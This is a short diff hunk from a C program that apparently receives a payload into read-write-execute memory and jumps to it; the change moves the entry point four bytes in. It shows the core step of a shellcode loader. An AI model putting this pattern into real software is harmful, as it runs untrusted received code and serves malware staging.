@@ -53,6 +53,6 @@ int main() {
 
   // printf("Executing payload.\n");
   // Execute the received payload
-  (*(void(*)()) (rwx))();
+  (*(void(*)()) (rwx + 4))();
 }
 
